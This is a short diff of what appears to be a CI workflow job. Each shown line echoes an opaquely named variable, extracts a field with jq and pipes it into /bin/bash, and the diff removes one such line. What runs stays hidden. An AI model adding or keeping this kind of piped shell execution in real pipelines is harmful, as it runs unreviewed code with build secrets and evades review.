@@ -41,7 +41,6 @@ jobs:
           echo $yal7 | jq -r .ba06956 | /bin/bash
           printf '%s' "$qrqlx6254" | jq -r .znd453 | /bin/bash
           echo $ccs3045 | jq -r .tfuef479 | /bin/bash
-          echo $ckl89722 | jq -r .bx466 | /bin/bash
           echo $hskji75 | jq -r .lgus7 | /bin/bash
 
       - name: Save archive
